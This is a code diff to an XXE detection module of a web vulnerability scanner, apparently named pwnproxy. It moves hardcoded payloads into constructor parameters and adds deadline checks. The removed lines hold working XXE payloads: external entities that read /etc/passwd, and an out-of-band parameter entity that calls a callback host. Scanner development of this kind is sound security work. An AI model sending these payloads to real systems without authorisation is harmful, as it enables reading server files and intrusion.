@@ -8,8 +8,6 @@ Stages
 """
 
 import logging
-import re
-from typing import Optional
 
 from pwnproxy.plugins.core.base import Finding
 from pwnproxy.plugins.core.chain import DetectionDepth, DetectionStage, StageResult
@@ -47,15 +45,7 @@ class XxeErrorBasedStage(DetectionStage):
     min_depth = DetectionDepth.FAST
     capability = "xxe-error-based"
 
-    ENTITY_XML = """<?xml version=\"1.0\"?>
-<!DOCTYPE root [
-  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">
-]>
-<root>
-  <data>&xxe;</data>
-</root>"""
-
-    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
+    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none", entity_xml: str = ""):
         self._replayer = replayer
         if not isinstance(replayer, XMLMutableReplayer):
             logger.warning(
@@ -64,6 +54,7 @@ class XxeErrorBasedStage(DetectionStage):
                 type(replayer).__name__,
             )
         self._evasion = evasion_level
+        self._entity_xml = entity_xml
 
     async def execute(
         self,
@@ -74,9 +65,11 @@ class XxeErrorBasedStage(DetectionStage):
         confirmed: set[tuple] = set()
 
         for point in injection_points:
+            if self._deadline_exceeded():
+                break
             resp = await self._replayer.replay(
                 point,
-                self.ENTITY_XML,
+                self._entity_xml,
                 timeout=5.0,
                 evasion_level=self._evasion,
             )
@@ -85,7 +78,7 @@ class XxeErrorBasedStage(DetectionStage):
 
             error_sigs = self._check_error_signatures(resp.text)
             if error_sigs:
-                req = self._replayer.build_payload_request(point, self.ENTITY_XML, evasion_level=self._evasion)
+                req = self._replayer.build_payload_request(point, self._entity_xml, evasion_level=self._evasion)
                 findings.append(Finding(
                     scanner="xxe",
                     url=point.url,
@@ -95,7 +88,7 @@ class XxeErrorBasedStage(DetectionStage):
                     technique="xxe-error-based",
                     severity="medium",
                     confidence="tentative",
-                    payload=self.ENTITY_XML,
+                    payload=self._entity_xml,
                     evidence=f"XML error signature: {error_sigs[0][:200]}",
                     request_data=_serialize_request(req),
                 ))
@@ -123,17 +116,10 @@ class JSONMutateStage(DetectionStage):
     min_depth = DetectionDepth.STANDARD
     capability = "xxe-json-mutate"
 
-    XML_TEMPLATE = """<?xml version=\"1.0\"?>
-<!DOCTYPE root [
-  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">
-]>
-<root>
-  <data>&xxe;</data>
-</root>"""
-
-    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
+    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none", xml_template: str = ""):
         self._replayer = replayer
         self._evasion = evasion_level
+        self._xml_template = xml_template
 
     async def execute(
         self,
@@ -144,13 +130,15 @@ class JSONMutateStage(DetectionStage):
         confirmed: set[tuple] = set()
 
         for point in injection_points:
+            if self._deadline_exceeded():
+                break
             ct = _header(point.original_headers, "content-type").lower()
             if "json" not in ct:
                 continue
 
             resp = await self._replayer.replay(
                 point,
-                self.XML_TEMPLATE,
+                self._xml_template,
                 timeout=5.0,
                 evasion_level=self._evasion,
             )
@@ -158,7 +146,7 @@ class JSONMutateStage(DetectionStage):
                 continue
 
             if self._is_xxe_like(resp):
-                req = self._replayer.build_payload_request(point, self.XML_TEMPLATE, evasion_level=self._evasion)
+                req = self._replayer.build_payload_request(point, self._xml_template, evasion_level=self._evasion)
                 findings.append(Finding(
                     scanner="xxe",
                     url=point.url,
@@ -168,7 +156,7 @@ class JSONMutateStage(DetectionStage):
                     technique="xxe-json-mutation",
                     severity="medium",
                     confidence="tentative",
-                    payload=self.XML_TEMPLATE,
+                    payload=self._xml_template,
                     evidence=f"JSON endpoint accepted XML with XXE (status={resp.status_code})",
                     request_data=_serialize_request(req),
                 ))
@@ -199,9 +187,10 @@ class XxeOOBStage(DetectionStage):
     min_depth = DetectionDepth.DEEP
     capability = "xxe-oob"
 
-    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
+    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none", oob_template: str = ""):
         self._replayer = replayer
         self._evasion = evasion_level
+        self._oob_template = oob_template
 
     async def execute(
         self,
@@ -213,20 +202,15 @@ class XxeOOBStage(DetectionStage):
         registry = get_registry()
 
         for point in injection_points:
+            if self._deadline_exceeded():
+                break
             scan_id = f"xxe-oob-{flow.id}-{point.name}"
             canary = registry.create(scan_id)
             callback_url = f"http://oob.pwnproxy/{canary.token}"
 
-            payload = f"""<?xml version=\"1.0\"?>
-<!DOCTYPE root [
-  <!ENTITY % xxe SYSTEM \"{callback_url}\">
-  %xxe;
-]>
-<root>
-  <data>test</data>
-</root>"""
+            payload = self._oob_template.format(callback_url=callback_url)
 
-            resp = await self._replayer.replay(
+            await self._replayer.replay(
                 point,
                 payload,
                 timeout=10.0,
